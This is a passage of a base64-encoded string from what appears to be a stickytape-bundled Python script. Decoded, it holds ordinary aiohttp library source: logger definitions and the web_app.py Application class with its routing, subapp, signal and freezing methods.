5jbGllbnRfbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoImFpb2h0dHAuY2xpZW50IilcclxuaW50ZXJuYWxfbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoImFpb2h0dHAuaW50ZXJuYWwiKVxyXG5zZXJ2ZXJfbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoImFpb2h0dHAuc2VydmVyIilcclxud2ViX2xvZ2dlciA9IGxvZ2dpbmcuZ2V0TG9nZ2VyKCJhaW9odHRwLndlYiIpXHJcbndzX2xvZ2dlciA9IGxvZ2dpbmcuZ2V0TG9nZ2VyKCJhaW9odHRwLndlYnNvY2tldCIpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3dlYl9hcHAucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBsb2dnaW5nXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5mcm9tIGZ1bmN0b29scyBpbXBvcnQgcGFydGlhbCwgdXBkYXRlX3dyYXBwZXJcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIFRZUEVfQ0hFQ0tJTkcsXHJcbiAgICBBbnksXHJcbiAgICBBc3luY0l0ZXJhdG9yLFxyXG4gICAgQXdhaXRhYmxlLFxyXG4gICAgQ2FsbGFibGUsXHJcbiAgICBEaWN0LFxyXG4gICAgSXRlcmFibGUsXHJcbiAgICBJdGVyYXRvcixcclxuICAgIExpc3QsXHJcbiAgICBNYXBwaW5nLFxyXG4gICAgTXV0YWJsZU1hcHBpbmcsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFNlcXVlbmNlLFxyXG4gICAgVHVwbGUsXHJcbiAgICBUeXBlLFxyXG4gICAgVW5pb24sXHJcbiAgICBjYXN0LFxyXG4pXHJcblxyXG5mcm9tIGFpb3NpZ25hbCBpbXBvcnQgU2lnbmFsXHJcbmZyb20gZnJvemVubGlzdCBpbXBvcnQgRnJvemVuTGlzdFxyXG5cclxuZnJvbSAuIGltcG9ydCBoZHJzXHJcbmZyb20gLmFiYyBpbXBvcnQgKFxyXG4gICAgQWJzdHJhY3RBY2Nlc3NMb2dnZXIsXHJcbiAgICBBYnN0cmFjdE1hdGNoSW5mbyxcclxuICAgIEFic3RyYWN0Um91dGVyLFxyXG4gICAgQWJzdHJhY3RTdHJlYW1Xcml0ZXIsXHJcbilcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgREVCVUdcclxuZnJvbSAuaHR0cF9wYXJzZXIgaW1wb3J0IFJhd1JlcXVlc3RNZXNzYWdlXHJcbmZyb20gLmxvZyBpbXBvcnQgd2ViX2xvZ2dlclxyXG5mcm9tIC5zdHJlYW1zIGltcG9ydCBTdHJlYW1SZWFkZXJcclxuZnJvbSAud2ViX2xvZyBpbXBvcnQgQWNjZXNzTG9nZ2VyXHJcbmZyb20gLndlYl9taWRkbGV3YXJlcyBpbXBvcnQgX2ZpeF9yZXF1ZXN0X2N1cnJlbnRfYXBwXHJcbmZyb20gLndlYl9wcm90b2NvbCBpbXBvcnQgUmVxdWVzdEhhbmRsZXJcclxuZnJvbSAud2ViX3JlcXVlc3QgaW1wb3J0IFJlcXVlc3RcclxuZnJvbSAud2ViX3Jlc3BvbnNlIGltcG9ydCBTdHJlYW1SZXNwb25zZVxyXG5mcm9tIC53ZWJfcm91dGVkZWYgaW1wb3J0IEFic3RyYWN0Um91dGVEZWZcclxuZnJvbSAud2ViX3NlcnZlciBpbXBvcnQgU2VydmVyXHJcbmZyb20gLndlYl91cmxkaXNwYXRjaGVyIGltcG9ydCAoXHJcbiAgICBBYnN0cmFjdFJlc291cmNlLFxyXG4gICAgQWJzdHJhY3RSb3V0ZSxcclxuICAgIERvbWFpbixcclxuICAgIE1hc2tEb21haW4sXHJcbiAgICBNYXRjaGVkU3ViQXBwUmVzb3VyY2UsXHJcbiAgICBQcmVmaXhlZFN1YkFwcFJlc291cmNlLFxyXG4gICAgVXJsRGlzcGF0Y2hlcixcclxuKVxyXG5cclxuX19hbGxfXyA9ICgiQXBwbGljYXRpb24iLCAiQ2xlYW51cEVycm9yIilcclxuXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC50eXBlZGVmcyBpbXBvcnQgSGFuZGxlclxyXG5cclxuICAgIF9BcHBTaWduYWwgPSBTaWduYWxbQ2FsbGFibGVbWyJBcHBsaWNhdGlvbiJdLCBBd2FpdGFibGVbTm9uZV1dXVxyXG4gICAgX1Jlc3BQcmVwYXJlU2lnbmFsID0gU2lnbmFsW0NhbGxhYmxlW1tSZXF1ZXN0LCBTdHJlYW1SZXNwb25zZV0sIEF3YWl0YWJsZVtOb25lXV1dXHJcbiAgICBfTWlkZGxld2FyZSA9IFVuaW9uW1xyXG4gICAgICAgIENhbGxhYmxlW1tSZXF1ZXN0LCBIYW5kbGVyXSwgQXdhaXRhYmxlW1N0cmVhbVJlc3BvbnNlXV0sXHJcbiAgICAgICAgQ2FsbGFibGVbWyJBcHBsaWNhdGlvbiIsIEhhbmRsZXJdLCBBd2FpdGFibGVbSGFuZGxlcl1dLCAgIyBvbGQtc3R5bGVcclxuICAgIF1cclxuICAgIF9NaWRkbGV3YXJlcyA9IEZyb3plbkxpc3RbX01pZGRsZXdhcmVdXHJcbiAgICBfTWlkZGxld2FyZXNIYW5kbGVycyA9IE9wdGlvbmFsW1NlcXVlbmNlW1R1cGxlW19NaWRkbGV3YXJlLCBib29sXV1dXHJcbiAgICBfU3ViYXBwcyA9IExpc3RbIkFwcGxpY2F0aW9uIl1cclxuZWxzZTpcclxuICAgICMgTm8gdHlwZSBjaGVja2VyIG1vZGUsIHNraXAgdHlwZXNcclxuICAgIF9BcHBTaWduYWwgPSBTaWduYWxcclxuICAgIF9SZXNwUHJlcGFyZVNpZ25hbCA9IFNpZ25hbFxyXG4gICAgX01pZGRsZXdhcmUgPSBDYWxsYWJsZVxyXG4gICAgX01pZGRsZXdhcmVzID0gRnJvemVuTGlzdFxyXG4gICAgX01pZGRsZXdhcmVzSGFuZGxlcnMgPSBPcHRpb25hbFtTZXF1ZW5jZV1cclxuICAgIF9TdWJhcHBzID0gTGlzdFxyXG5cclxuXHJcbmNsYXNzIEFwcGxpY2F0aW9uKE11dGFibGVNYXBwaW5nW3N0ciwgQW55XSk6XHJcbiAgICBBVFRSUyA9IGZyb3plbnNldChcclxuICAgICAgICBbXHJcbiAgICAgICAgICAgICJsb2dnZXIiLFxyXG4gICAgICAgICAgICAiX2RlYnVnIixcclxuICAgICAgICAgICAgIl9yb3V0ZXIiLFxyXG4gICAgICAgICAgICAiX2xvb3AiLFxyXG4gICAgICAgICAgICAiX2hhbmRsZXJfYXJncyIsXHJcbiAgICAgICAgICAgICJfbWlkZGxld2FyZXMiLFxyXG4gICAgICAgICAgICAiX21pZGRsZXdhcmVzX2hhbmRsZXJzIixcclxuICAgICAgICAgICAgIl9ydW5fbWlkZGxld2FyZXMiLFxyXG4gICAgICAgICAgICAiX3N0YXRlIixcclxuICAgICAgICAgICAgIl9mcm96ZW4iLFxyXG4gICAgICAgICAgICAiX3ByZV9mcm96ZW4iLFxyXG4gICAgICAgICAgICAiX3N1YmFwcHMiLFxyXG4gICAgICAgICAgICAiX29uX3Jlc3BvbnNlX3ByZXBhcmUiLFxyXG4gICAgICAgICAgICAiX29uX3N0YXJ0dXAiLFxyXG4gICAgICAgICAgICAiX29uX3NodXRkb3duIixcclxuICAgICAgICAgICAgIl9vbl9jbGVhbnVwIixcclxuICAgICAgICAgICAgIl9jbGllbnRfbWF4X3NpemUiLFxyXG4gICAgICAgICAgICAiX2NsZWFudXBfY3R4IixcclxuICAgICAgICBdXHJcbiAgICApXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgKixcclxuICAgICAgICBsb2dnZXI6IGxvZ2dpbmcuTG9nZ2VyID0gd2ViX2xvZ2dlcixcclxuICAgICAgICByb3V0ZXI6IE9wdGlvbmFsW1VybERpc3BhdGNoZXJdID0gTm9uZSxcclxuICAgICAgICBtaWRkbGV3YXJlczogSXRlcmFibGVbX01pZGRsZXdhcmVdID0gKCksXHJcbiAgICAgICAgaGFuZGxlcl9hcmdzOiBPcHRpb25hbFtNYXBwaW5nW3N0ciwgQW55XV0gPSBOb25lLFxyXG4gICAgICAgIGNsaWVudF9tYXhfc2l6ZTogaW50ID0gMTAyNCAqKiAyLFxyXG4gICAgICAgIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSxcclxuICAgICAgICBkZWJ1ZzogQW55ID0gLi4uLCAgIyBteXB5IGRvZXNuXCd0IHN1cHBvcnQgZWxsaXBzaXNcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiByb3V0ZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgcm91dGVyID0gVXJsRGlzcGF0Y2hlcigpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJyb3V0ZXIgYXJndW1lbnQgaXMgZGVwcmVjYXRlZCIsIERlcHJlY2F0aW9uV2FybmluZywgc3RhY2tsZXZlbD0yXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShyb3V0ZXIsIEFic3RyYWN0Um91dGVyKSwgcm91dGVyXHJcblxyXG4gICAgICAgIGlmIGxvb3AgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICAgICAibG9vcCBhcmd1bWVudCBpcyBkZXByZWNhdGVkIiwgRGVwcmVjYXRpb25XYXJuaW5nLCBzdGFja2xldmVsPTJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBkZWJ1ZyBpcyBub3QgLi4uOlxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgImRlYnVnIGFyZ3VtZW50IGlzIGRlcHJlY2F0ZWQiLCBEZXByZWNhdGlvbldhcm5pbmcsIHN0YWNrbGV2ZWw9MlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fZGVidWcgPSBkZWJ1Z1xyXG4gICAgICAgIHNlbGYuX3JvdXRlciA9IHJvdXRlciAgIyB0eXBlOiBVcmxEaXNwYXRjaGVyXHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLl9oYW5kbGVyX2FyZ3MgPSBoYW5kbGVyX2FyZ3NcclxuICAgICAgICBzZWxmLmxvZ2dlciA9IGxvZ2dlclxyXG5cclxuICAgICAgICBzZWxmLl9taWRkbGV3YXJlcyA9IEZyb3plbkxpc3QobWlkZGxld2FyZXMpICAjIHR5cGU6IF9NaWRkbGV3YXJlc1xyXG5cclxuICAgICAgICAjIGluaXRpYWxpemVkIG9uIGZyZWV6aW5nXHJcbiAgICAgICAgc2VsZi5fbWlkZGxld2FyZXNfaGFuZGxlcnMgPSBOb25lICAjIHR5cGU6IF9NaWRkbGV3YXJlc0hhbmRsZXJzXHJcbiAgICAgICAgIyBpbml0aWFsaXplZCBvbiBmcmVlemluZ1xyXG4gICAgICAgIHNlbGYuX3J1bl9taWRkbGV3YXJlcyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYm9vbF1cclxuXHJcbiAgICAgICAgc2VsZi5fc3RhdGUgPSB7fSAgIyB0eXBlOiBEaWN0W3N0ciwgQW55XVxyXG4gICAgICAgIHNlbGYuX2Zyb3plbiA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fcHJlX2Zyb3plbiA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fc3ViYXBwcyA9IFtdICAjIHR5cGU6IF9TdWJhcHBzXHJcblxyXG4gICAgICAgIHNlbGYuX29uX3Jlc3BvbnNlX3ByZXBhcmUgPSBTaWduYWwoc2VsZikgICMgdHlwZTogX1Jlc3BQcmVwYXJlU2lnbmFsXHJcbiAgICAgICAgc2VsZi5fb25fc3RhcnR1cCA9IFNpZ25hbChzZWxmKSAgIyB0eXBlOiBfQXBwU2lnbmFsXHJcbiAgICAgICAgc2VsZi5fb25fc2h1dGRvd24gPSBTaWduYWwoc2VsZikgICMgdHlwZTogX0FwcFNpZ25hbFxyXG4gICAgICAgIHNlbGYuX29uX2NsZWFudXAgPSBTaWduYWwoc2VsZikgICMgdHlwZTogX0FwcFNpZ25hbFxyXG4gICAgICAgIHNlbGYuX2NsZWFudXBfY3R4ID0gQ2xlYW51cENvbnRleHQoKVxyXG4gICAgICAgIHNlbGYuX29uX3N0YXJ0dXAuYXBwZW5kKHNlbGYuX2NsZWFudXBfY3R4Ll9vbl9zdGFydHVwKVxyXG4gICAgICAgIHNlbGYuX29uX2NsZWFudXAuYXBwZW5kKHNlbGYuX2NsZWFudXBfY3R4Ll9vbl9jbGVhbnVwKVxyXG4gICAgICAgIHNlbGYuX2NsaWVudF9tYXhfc2l6ZSA9IGNsaWVudF9tYXhfc2l6ZVxyXG5cclxuICAgIGRlZiBfX2luaXRfc3ViY2xhc3NfXyhjbHM6IFR5cGVbIkFwcGxpY2F0aW9uIl0pIC0+IE5vbmU6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgIkluaGVyaXRhbmNlIGNsYXNzIHt9IGZyb20gd2ViLkFwcGxpY2F0aW9uICJcclxuICAgICAgICAgICAgImlzIGRpc2NvdXJhZ2VkIi5mb3JtYXQoY2xzLl9fbmFtZV9fKSxcclxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGlmIERFQlVHOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcblxyXG4gICAgICAgIGRlZiBfX3NldGF0dHJfXyhzZWxmLCBuYW1lOiBzdHIsIHZhbDogQW55KSAtPiBOb25lOlxyXG4gICAgICAgICAgICBpZiBuYW1lIG5vdCBpbiBzZWxmLkFUVFJTOlxyXG4gICAgICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICAgICAiU2V0dGluZyBjdXN0b20gd2ViLkFwcGxpY2F0aW9uLnt9IGF0dHJpYnV0ZSAiXHJcbiAgICAgICAgICAgICAgICAgICAgImlzIGRpc2NvdXJhZ2VkIi5mb3JtYXQobmFtZSksXHJcbiAgICAgICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICAgICAgICAgIHN0YWNrbGV2ZWw9MixcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc3VwZXIoKS5fX3NldGF0dHJfXyhuYW1lLCB2YWwpXHJcblxyXG4gICAgIyBNdXRhYmxlTWFwcGluZyBBUElcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYgaXMgb3RoZXJcclxuXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwga2V5OiBzdHIpIC0+IEFueTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fc3RhdGVba2V5XVxyXG5cclxuICAgIGRlZiBfY2hlY2tfZnJvemVuKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fZnJvemVuOlxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgIkNoYW5naW5nIHN0YXRlIG9mIHN0YXJ0ZWQgb3Igam9pbmVkICIgImFwcGxpY2F0aW9uIGlzIGRlcHJlY2F0ZWQiLFxyXG4gICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICAgICAgc3RhY2tsZXZlbD0zLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fc2V0aXRlbV9fKHNlbGYsIGtleTogc3RyLCB2YWx1ZTogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2NoZWNrX2Zyb3plbigpXHJcbiAgICAgICAgc2VsZi5fc3RhdGVba2V5XSA9IHZhbHVlXHJcblxyXG4gICAgZGVmIF9fZGVsaXRlbV9fKHNlbGYsIGtleTogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2NoZWNrX2Zyb3plbigpXHJcbiAgICAgICAgZGVsIHNlbGYuX3N0YXRlW2tleV1cclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9zdGF0ZSlcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3Jbc3RyXTpcclxuICAgICAgICByZXR1cm4gaXRlcihzZWxmLl9zdGF0ZSlcclxuXHJcbiAgICAjIyMjIyMjI1xyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbG9vcChzZWxmKSAtPiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wOlxyXG4gICAgICAgICMgVGVjaG5pY2FsbHkgdGhlIGxvb3AgY2FuIGJlIE5vbmVcclxuICAgICAgICAjIGJ1dCB3ZSBtYXNrIGl0IGJ5IGV4cGxpY2l0IHR5cGUgY2FzdFxyXG4gICAgICAgICMgdG8gcHJvdmlkZSBtb3JlIGNvbnZpbmllbnQgdHlwZSBhbm5vdGF0aW9uXHJcbiAgICAgICAgd2FybmluZ3Mud2FybigibG9vcCBwcm9wZXJ0eSBpcyBkZXByZWNhdGVkIiwgRGVwcmVjYXRpb25XYXJuaW5nLCBzdGFja2xldmVsPTIpXHJcbiAgICAgICAgcmV0dXJuIGNhc3QoYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCwgc2VsZi5fbG9vcClcclxuXHJcbiAgICBkZWYgX3NldF9sb29wKHNlbGYsIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGxvb3AgaXMgTm9uZTpcclxuICAgICAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIGlmIHNlbGYuX2xvb3AgaXMgbm90IE5vbmUgYW5kIHNlbGYuX2xvb3AgaXMgbm90IGxvb3A6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ3ZWIuQXBwbGljYXRpb24gaW5zdGFuY2UgaW5pdGlhbGl6ZWQgd2l0aCBkaWZmZXJlbnQgbG9vcCJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9sb29wID0gbG9vcFxyXG5cclxuICAgICAgICAjIHNldCBsb29wIGRlYnVnXHJcbiAgICAgICAgaWYgc2VsZi5fZGVidWcgaXMgLi4uOlxyXG4gICAgICAgICAgICBzZWxmLl9kZWJ1ZyA9IGxvb3AuZ2V0X2RlYnVnKClcclxuXHJcbiAgICAgICAgIyBzZXQgbG9vcCB0byBzdWIgYXBwbGljYXRpb25zXHJcbiAgICAgICAgZm9yIHN1YmFwcCBpbiBzZWxmLl9zdWJhcHBzOlxyXG4gICAgICAgICAgICBzdWJhcHAuX3NldF9sb29wKGxvb3ApXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHJlX2Zyb3plbihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wcmVfZnJvemVuXHJcblxyXG4gICAgZGVmIHByZV9mcmVlemUoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9wcmVfZnJvemVuOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VsZi5fcHJlX2Zyb3plbiA9IFRydWVcclxuICAgICAgICBzZWxmLl9taWRkbGV3YXJlcy5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX3JvdXRlci5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX3Jlc3BvbnNlX3ByZXBhcmUuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9jbGVhbnVwX2N0eC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX3N0YXJ0dXAuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9vbl9zaHV0ZG93bi5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX2NsZWFudXAuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9taWRkbGV3YXJlc19oYW5kbGVycyA9IHR1cGxlKHNlbGYuX3ByZXBhcmVfbWlkZGxld2FyZSgpKVxyXG5cclxuICAgICAgICAjIElmIGN1cnJlbnQgYXBwIGFuZCBhbnkgc3ViYXBwIGRvIG5vdCBoYXZlIG1pZGRsZXdhcmVzIGF2b2lkIHJ1biBhbGxcclxuICAgICAgICAjIG9mIHRoZSBjb2RlIGZvb3RwcmludCB0aGF0IGl0IGltcGxpZXMsIHdoaWNoIGhhdmUgYSBtaWRkbGV3YXJlXHJcbiAgICAgICAgIyBoYXJkY29kZWQgcGVyIGFwcCB0aGF0IHNldHMgdXAgdGhlIGN1cnJlbnRfYXBwIGF0dHJpYnV0ZS4gSWYgbm9cclxuICAgICAgICAjIG1pZGRsZXdhcmVzIGFyZSBjb25maWd1cmVkIHRoZSBoYW5kbGVyIHdpbGwgcmVjZWl2ZSB0aGUgcHJvcGVyXHJcbiAgICAgICAgIyBjdXJyZW50X2FwcCB3aXRob3V0IG5lZWRpbmcgYWxsIG9mIHRoaXMgY29kZS5cclxuICAgICAgICBzZWxmLl9ydW5fbWlkZGxld2FyZXMgPSBUcnVlIGlmIHNlbGYubWlkZGxld2FyZXMgZWxzZSBGYWxzZVxyXG5cclxuICAgICAgICBmb3Igc3ViYXBwIGluIHNlbGYuX3N1YmFwcHM6XHJcbiAgICAgICAgICAgIHN1YmFwcC5wcmVfZnJlZXplKClcclxuICAgICAgICAgICAgc2VsZi5fcnVuX21pZGRsZXdhcmVzID0gc2VsZi5fcnVuX21pZGRsZXdhcmVzIG9yIHN1YmFwcC5fcnVuX21pZGRsZXdhcmVzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZnJvemVuKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Zyb3plblxyXG5cclxuICAgIGRlZiBmcmVlemUoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9mcm96ZW46XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWxmLnByZV9mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX2Zyb3plbiA9IFRydWVcclxuICAgICAgICBmb3Igc3ViYXBwIGluIHNlbGYuX3N1YmFwcHM6XHJcbiAgICAgICAgICAgIHN1YmFwcC5mcmVlemUoKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGRlYnVnKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybigiZGVidWcgcHJvcGVydHkgaXMgZGVwcmVjYXRlZCIsIERlcHJlY2F0aW9uV2FybmluZywgc3RhY2tsZXZlbD0yKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kZWJ1ZyAgIyB0eXBlOiBpZ25vcmVbbm8tYW55LXJldHVybl1cclxuXHJcbiAgICBkZWYgX3JlZ19zdWJhcHBfc2lnbmFscyhzZWxmLCBzdWJhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IE5vbmU6XHJcbiAgICAgICAgZGVmIHJlZ19oYW5kbGVyKHNpZ25hbWU6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICAgICAgc3Vic2lnID0gZ2V0YXR0cihzdWJhcHAsIHNpZ25hbWUpXHJcblxyXG4gICAgICAgICAgICBhc3luYyBkZWYgaGFuZGxlcihhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IE5vbmU6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzdWJzaWcuc2VuZChzdWJhcHApXHJcblxyXG4gICAgICAgICAgICBhcHBzaWcgPSBnZXRhdHRyKHNlbGYsIHNpZ25hbWUpXHJcbiAgICAgICAgICAgIGFwcHNpZy5hcHBlbmQoaGFuZGxlcilcclxuXHJcbiAgICAgICAgcmVnX2hhbmRsZXIoIm9uX3N0YXJ0dXAiKVxyXG4gICAgICAgIHJlZ19oYW5kbGVyKCJvbl9zaHV0ZG93biIpXHJcbiAgICAgICAgcmVnX2hhbmRsZXIoIm9uX2NsZWFudXAiKVxyXG5cclxuICAgIGRlZiBhZGRfc3ViYXBwKHNlbGYsIHByZWZpeDogc3RyLCBzdWJhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IEFic3RyYWN0UmVzb3VyY2U6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocHJlZml4LCBzdHIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIlByZWZpeCBtdXN0IGJlIHN0ciIpXHJcbiAgICAgICAgcHJlZml4ID0gcHJlZml4LnJzdHJpcCgiLyIpXHJcbiAgICAgICAgaWYgbm90IHByZWZpeDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiUHJlZml4IGNhbm5vdCBiZSBlbXB0eSIpXHJcbiAgICAgICAgZmFjdG9yeSA9IHBhcnRpYWwoUHJlZml4ZWRTdWJBcHBSZXNvdXJjZSwgcHJlZml4LCBzdWJhcHApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2FkZF9zdWJhcHAoZmFjdG9yeSwgc3ViYXBwKVxyXG5cclxuICAgIGRlZiBfYWRkX3N1YmFwcChcclxuICAgICAgICBzZWxmLCByZXNvdXJjZV9mYWN0b3J5OiBDYWxsYWJsZVtbXSwgQWJzdHJhY3RSZXNvdXJjZV0sIHN1YmFwcDogIkFwcGxpY2F0aW9uIlxyXG4gICAgKSAtPiBBYnN0cmFjdFJlc291cmNlOlxyXG4gICAgICAgIGlmIHNlbGYuZnJvemVuOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbm5vdCBhZGQgc3ViIGFwcGxpY2F0aW9uIHRvIGZyb3plbiBhcHBsaWNhdGlvbiIpXHJcbiAgICAgICAgaWYgc3ViYXBwLmZyb3plbjpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgYWRkIGZyb3plbiBhcHBsaWNhdGlvbiIpXHJcbiAgICAgICAgcmVzb3VyY2UgPSByZXNvdXJjZV9mYWN0b3J5KClcclxuICAgICAgICBzZWxmLnJvdXRlci5yZWdpc3Rlcl9yZXNvdXJjZShyZXNvdXJjZSlcclxuICAgICAgICBzZWxmLl9yZWdfc3ViYXBwX3NpZ25hbHMoc3ViYXBwKVxyXG4gICAgICAgIHNlbGYuX3N1YmFwcHMuYXBwZW5kKHN1YmFwcClcclxuICAgICAgICBzdWJhcHAucHJlX2ZyZWV6ZSgpXHJcbiAgICAgICAgaWYgc2VsZi5fbG9vcCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc3ViYXBwLl9zZXRfbG9vcChzZWxmLl9sb29wKVxyXG4gICAgICAgIHJldHVybiByZXNvdXJjZVxyXG5cclxuICAgIGRlZiBhZGRfZG9tYWluKHNlbGYsIGRvbWFpbjogc3RyLCBzdWJhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IEFic3RyYWN0UmVzb3VyY2U6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZG9tYWluLCBzdHIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkRvbWFpbiBtdXN0IGJlIHN0ciIpXHJcbiAgICAgICAgZWxpZiAiKiIgaW4gZG9tYWluOlxyXG4gICAgICAgICAgICBydWxlID0gTWFza0RvbWFpbihkb21haW4pICAjIHR5cGU6IERvbWFpblxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJ1bGUgPSBEb21haW4oZG9tYWluKVxyXG4gICAgICAgIGZhY3RvcnkgPSBwYXJ0aWFsKE1hdGNoZWRTdWJBcHBSZXNvdXJjZSwgcnVsZSwgc3ViYXBwKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hZGRfc3ViYXBwKGZhY3RvcnksIHN1YmFwcClcclxuXHJcbiAgICBkZWYgYWRkX3JvdXRlcyhzZWxmLCByb3V0ZXM6IEl0ZXJhYmxlW0Fic3RyYWN0Um91dGVEZWZdKSAtPiBMaXN0W0Fic3RyYWN0Um91dGVdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnJvdXRlci5hZGRfcm91dGVzKHJvdXRlcylcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvbl9yZXNwb25zZV9wcmVwYXJlKHNlbGYpIC0+IF9SZXNwUHJlcGFyZVNpZ25hbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fcmVzcG9uc2VfcHJlcGFyZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX3N0YXJ0dXAoc2VsZikgLT4gX0FwcFNpZ25hbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fc3RhcnR1cFxyXG5cclxuICAgIEBwcm